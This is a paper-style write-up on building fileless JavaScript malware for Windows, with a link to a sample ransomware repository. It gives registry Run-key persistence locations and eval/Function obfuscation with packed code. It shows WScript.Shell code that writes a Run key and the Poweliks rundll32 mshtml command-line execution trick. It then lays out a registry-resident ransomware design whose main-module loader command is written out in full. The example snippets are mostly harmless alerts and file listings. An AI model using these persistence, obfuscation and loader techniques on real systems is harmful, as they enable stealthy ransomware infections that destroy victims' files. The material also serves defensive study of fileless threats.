[Sample Javascript based Ransomeware :  _https://github.com/rpgeeganage/file-less-ransomware-demo_ ]

1.  **Introduction**

The evolution of the malicious software has come along distance throughout these years. The early MBR (Master Boot Record) infector to advance network infiltration capabilities such as exploiting knowing vulnerabilities has proven that revolution in computer technology has negative aftermath. In parallel to this particular evolution, anti-malware software has gain rapid speed in development of various techniques to success in overcoming the malicious software.

In this context, malware authors required to discover unique methodologies to stay ahead of anti-malware software. Due to this reason, file less malware that differ from the traditional approach has introduced.

The main advantage of the file-less malware is, traditional anti-malware techniques can be bypass easily due to unavailability of any file residual in post initial stage of infection. The traditional signature based technique has less impact on file less malware due to unavailability of files to scan for a signature in post initial stage of infection. In addition to that, behavioral-based malware detection technique may produce false positive results on detecting this particular file less approach.

The Internet worm Slammer is considered as the first file-less malware, which used the vulnerability in Microsoft SQL server to infiltrate server and reside only in the RAM of the server. In this approach malware fully operates inside RAM of the particular server. This approach is effective on a server environment because, servers are less likely to get restarted. In addition to that, malware such as Poweliks is another addition to file-less malware category. 

This paper reviews the JavaScript usage for file-less malware approach in Microsoft Windows.

1.  **Stages of malware infection**

There are three main stages is visible in a typical malware infection. These stages can be redefined based on the context. During this paper, following stages are defined as the main stages of a malware.

1.  Entry – during this stage, malware tries to infiltrates the victim via drive-by-download, exploitation, etc.
2.  Infection – in this stage, after successful infiltration, malware tries to gain control over the victim’s PC by stabling itself.
3.  Execution – in this stage, victim PC lost entire control to the malware. The infected PC is ready to obey the controller and perform required actions such as distributing itself, act as a zombie, etc.

 The anti-malware software considers being less effective in post infection stage. Apart from that, the file-less characteristic is comes in to the consideration during the infection stage.

1.  **Persistence and Triggering points**

The persistency and the triggering points are the key requirements of a malware. A malware required being persistent in the victim’s PC, in order to fulfil the give requirements. In addition, malware need a triggering mechanism to get executed in an event such as victim’s PC got restarted. As a result, traditional malware approach drops copies of itself in locations where, operating systems executes particular applications without any user interaction. In that context, file-less approach of a malware must be designed to address the main key requirements as mentioned above.

The file-less approach of malware has two techniques. 

*   Reside on the RAM of infected PC.

This technique is very effective in a server environment. The Slammer malware adopted this technique and resided in the infected server RAM. The persistency is depends on the server uptime. The triggering point can be considered as not applicable because the servers are unlikely to get restarted. In a PC environment, reside in the RAM is less effective.

*   Reside in registry hives of the PC.

Storing the body of the malware inside the registry hive is more effective in a PC environment. In this approach, both persistency and requirement of a triggering point are achievable with a less effort. The Poweliks malware adopted this approach. The Powerliks malware store the dropper in local registry hive and then initiate the downloading of sub modules.

1.  **Utilizing Registry Hives**

A file-less malware required to utilize featured provided by the operating system in order to success. The registry hives are the most important feature is used by the file-less malware. The registry hives act as a local database for the entire operating system. The each hive has separate role to handle. In the context of malware, registry hive utilization is categorized to three sections.

*   At system boot

The triggering points that created under these entries are getting executed from system boot till the boot process reaches the user logon screen. In addition to that, these entries are applied to all the users.

Following are few examples.

*   _HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services_
*   _HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion__\ShellServiceObjectDelayLoad_

*   After user login

The triggering points that created under these entries are triggered mainly to the individual user. The privileges inherited by these programs are same as the logged in user.

Following are few examples.

*   _HKEY_LOCAL_MACHINE \ Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run_
*   _HKEY_LOCAL_MACHINE \ Software\Microsoft\Windows\CurrentVersion\Run_
*   _HKEY_CURRENT_USER \Software\Microsoft\Windows NT\CurrentVersion\Windows\Run_
*   _HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run_

*   User interaction 

The triggering points that are created under these entries are getting executed during the user interaction such as open a file type, open web browser.

Following are few examples.

*   _HKEY_LOCAL_MACHINE\Software\Classes\Exefile\Shell\Open\command_
*   _HKEY_CLASSES_ROOT\Exefile\Shell\Open\Command_

1.  **Code obfuscation for JavaScript**

 In modern day, JavaScript has gained a lot of attention as well as functionalities. Through JavaScript, code obfuscation is very feasible. The _eval()_ function provides facility to convert give string to a executable statement.

For example,

                        _eval(“alert(‘This is an alert !’)”);_

Above code snippet will result an alert box popup.

In addition to simple code, following example shows feasible method to obfuscating the code or builds a polymorphic malware body.

JavaScript original function is as below;

_var x = {_

_    f1: function(msg){_

_          alert(msg);_

_     }_

_};_

_x.f1('hi');_

 The obfuscated output for the same function is as follows.

 _eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3 0={2:4(1){5(1)}};0.2(\'6\');',7,7,'x|msg|f1|var|function|alert|hi'.split('|'),0,{}))_

 The final result of the both above expressions are same.

The above example uses the _eval()_ function, which considered as dangerous function. In that manner, _eval()_ function can be replaced via following technique,

_Function(“<executable statement as a string”>)();_

The result of the above statement is same as in _eval()_ function.

For example,

_Function(“alert(‘This is an alert !’)”)();_

 The _Function()_ prototype can create a function with given string as the function body. The syntax of using the _Function()_ prototype is as follows.

 _Function(Arg1, Arg2..., "Function Body");_

 In this context, _eval()_ function can be replaced as follows.

 _Function(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c])}}return p}('3 0={2:4(1){5(1)}};0.2(\'6\');',7,7,'x|msg|f1|var|function|alert|hi'.split('|')))();_

1.  **Accessing File System**

 The Microsoft Windows has developed a their own version of JavaScript which is referred as JScript.

The JScript can provide access to the file system in Microsoft Windows environment via ActiveX objects. The required ActiveX object is _Scripting.FileSystemObject._Following example shows a code snippet that can be used to access the files list in side a give directory.

_ var fso, f, f1, fc, s;_

_fso = new ActiveXObject("Scripting.FileSystemObject");_

_//get the folder by giving its path_

_f = fso.GetFolder("SampleFolder");_

_fc = new Enumerator(f.files);_

_s = "";_

_for (; !fc.atEnd(); fc.moveNext())_

_{_

_   s += fc.item();_

_   s += "\n";_

_}_

The ActiveX _Scripting.FileStstemObject_ has all the required functionalities such as creating, deleting, copying files and directories.

1.  **Accessing Registry Hives**

 The registry hives are accessible via ActiveX objects. The Microsoft Windows environment provides access to the registry entries via _WScript.Shell_ ActiveX object.

Following code snippet demonstrate the creating a registry entry via JavaScript.

 _var wsh = new ActiveXObject("WScript.Shell");_

_var key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\runMe";_

_wsh.RegWrite (key, “testScript.js”, "REG_SZ");_

By utilizing this technique, it is easy to create triggering point in any give registry hive.

1.  **Executing JavaScript in command line**

 The malware Poweliks has introduced an effective method to execute the JavaScript using the command line in Microsoft Windows environment.

Syntax is as follows.

_rundll32.exe javascript:"\..\mshtml,RunHTMLApplication "; <JavaScript Code Segment>_

 Following command will display a JavaScript alert with message “Test Message”.

 _rundll32.exe javascript:"\..\mshtml,RunHTMLApplication "; alert(‘Test Message’);_

 All the JavaScript statements must be encoded using URL encoding functionality. For example,

 Consider the following code snippet,

_var Afso,f,f1,fc,s;_

_fso=new ActiveXObject("Scripting.FileSystemObject");_  
_f=fso.GetFolder("C:\\Info");_  
_fc=new Enumerator(f.files);_  
_s= “”;_

_for(;!fc.atEnd();fc.moveNext()) {_

_    s+=fc.item();_  
_    s+=”\n”;_  
_}_

_alert(s);_

The above code snippet will show all the files inside the “_c:\\info_” folder. In order to execute above code snippet, it must be encoded as URL friendly format as follows. 

_var%20Afso%2Cf%2Cf1%2Cfc%2Cs%3Bfso%3Dnew%20ActiveXObject(%22Scripting.FileSystemObject%22)%3Bf%3Dfso.GetFolder(%22C%3A%5C%5CInfo%22)%3Bfc%3Dnew%20Enumerator(f.files)%3Bs%3D%22%22%3Bfor(%3B!fc.atEnd()%3Bfc.moveNext())%7Bs%2B%3Dfc.item()%3Bs%2B%3D%22%5Cn%22%7Dalert(s)%3B_

Then the encoded code segment can be executed as follows.

_rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";var%20Afso%2Cf%2Cf1%2Cfc%2Cs%3Bfso%3Dnew%20ActiveXObject(%22Scripting.FileSystemObject%22)%3Bf%3Dfso.GetFolder(%22C%3A%5C%5CInfo%22)%3Bfc%3Dnew%20Enumerator(f.files)%3Bs%3D%22%22%3Bfor(%3B!fc.atEnd()%3Bfc.moveNext())%7Bs%2B%3Dfc.item()%3Bs%2B%3D%22%5Cn%22%7Dalert(s)%3B_

By utilizing this methodology, any JavaScript function is accessible via command line. In this context, by creating a triggering point in a registry hive will execute JavaScript code segment without user interaction.

1.  **Modularizing the malware using registry hive**

In order to extend the functionality of the malware, it is feasible to approach in structure with modules. In that context, file-less malware can use utilize registry hives to store the each module.

Consider the following example.

The file-less malware has the functionality of ransom ware. The following are the basic component of the file-less ransom ware required.

*   Main module with entry point
*   File reading module
*   File encryption module
*   Public key

In order to store the each module, four registry entries can be created. The file reading, encryption and public key module may use none interactive registry entries and main module can be stored in registry entry where, automatic triggering occurred.

 Registry entries added as follows.

<table>

<tbody>

<tr>

<td>

_Module_

</td>

<td>

_Registry entry_

</td>

<td>

_Value_

</td>

</tr>

<tr>

<td>

_Main module_

</td>

<td>

_HKEY_LOCAL_MACHINE \ Software\Microsoft\Windows\ _

_CurrentVersion\Run_

</td>

<td>

_rundll32.exe javascript:"\..\_

_mshtml,RunHTMLApplication ";_

_document.write("\74script language=jscript.encode>"+_

_eval((new%20ActiveXObject("WScript.Shell"))._

_RegRead("HKLM\\fileReadModule"))+"\74/script>")_

</td>

</tr>

<tr>

<td>

_File reading Module_

</td>

<td>

_HKEY_LOCAL_MACHINE \ fileReadModule_

</td>

<td>

_Code segment for read files using Scripting.FileSystemObject and use eval() to call the file encryption module and pass the each file path_

</td>

</tr>

<tr>

<td>

_File encryption module_

</td>

<td>

_HKEY_LOCAL_MACHINE \ fileEncryptionModule_

</td>

<td>

_Implements RSA encryption using JavaScript encryption library such as CryptoJs_

</td>

</tr>

<tr>

<td>

_Public Key_

</td>

<td>

_ HKEY_LOCAL_MACHINE \ publickKey_

</td>

<td>

_RSA 2048 bit public key_

</td>

</tr>

</tbody>

</table>

The main module reads the file read module registry entry value and use _eval()_ function to execute. The file-reading module reads each file and builds a string with file encryption module with the file name.

_eval((new%20ActiveXObject("WScript.Shell")).RegRead("HKLM\\ fileEncryptionModule ")+fileName)    _

The ransom ware converts the strings in to executable commands using the _eval()_function.

1.  **Conclusion**

The JavaScript can be weaponized to build a file-less malware in very feasible manner. An expert design and using an exploit kit, JavaScript based malware can be delivered in very effective and feasible manner. The above factors have provided evidence to the feasibility of design process of the file-less malware using JavaScript.

1.  **Reference**

*   Wajeb Gharibi. “Studying and Classification of the Most Significant Malicious Software”. [On-line]. Available: http://arxiv.org/pdf/1106.0853v1.pdf [April 30 2014].
*   “Two Languages Are Created”. Internet:https://msdn.microsoft.com/en-us/library/windows/desktop/ms724877(v=vs.85).aspx/,[April 30, 2015].
*   “Analyzing Javascript Malware: Obfuscated Evil”. Internet: http://www.schillmania.com/content/entries/2009/javascript-malware-obfuscation-analysis/[May 21, 2015].
*   “Poweliks Malware Analysis”. Internet: https://www.codeandsec.com/Poweliks-Malware-Analysis/, [April 30, 2015].
*   Manuel Egele, Theodoor Scholete, Engin Kirda & Christopher Kruegel. “A Survey on Automated Dynamic Malware Analysis Techniques and Tools”. [On-line]. Available: https://www.iseclab.org/papers/malware_survey.pdf, [May 10, 2015].
*   Carsten Willems.“Internals of Windows Memory Management (not only) for Malware Analysis”.[On-line]. Available:https://ub-madoc.bib.uni-mannheim.de/3148/1/ InternalsOfWindowsMemoryMangement2.pdf, [May 10, 2015].
*   “Without a Trace: Fileless Malware Spotted in the Wild”.Internet: http://blog.trendmicro.com/trendlabs-security-intelligence/without-a-trace-fileless-malware-spotted-in-the-wild/, [May 1, 2015].
*   Mangesh Musale. “Hunting For Metamorphic JavaScript Malware”.Internet: [http://scholarworks.sjsu.edu/cgi/viewcontent.cgi?article=1357&context=etd_projects,](http://scholarworks.sjsu.edu/cgi/viewcontent.cgi?article=1357&context=etd_projects,) [May 25, 2015].
*   Ekta Gandotra, Divya Bansal, Sanjeev Sofat. “Malware Analysis and Classification: A Survey”. [On-line]. Available: http://www.scirp.org/journal/PaperDownload.aspx?paperID=44440, [May 10, 2015].
*   Max Goncharov. “Russian Underground Revisited”. Internet: http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-russian-underground-revisited.pdf, [May 25, 2015].
*   John Zorabedian . “How malware works: Anatomy of an attack in five stages (Infographic)”. Internet: https://blogs.sophos.com/2013/11/01/how-malware-works-anatomy-of-an-attack-in-five-stages-infographic/, [May 10, 2015].
*   Benoit A. “Poweliks – Command Line Confusion”. Internet: http://thisissecurity.net/2014/08/20/poweliks-command-line-confusion/[May 10, 2015].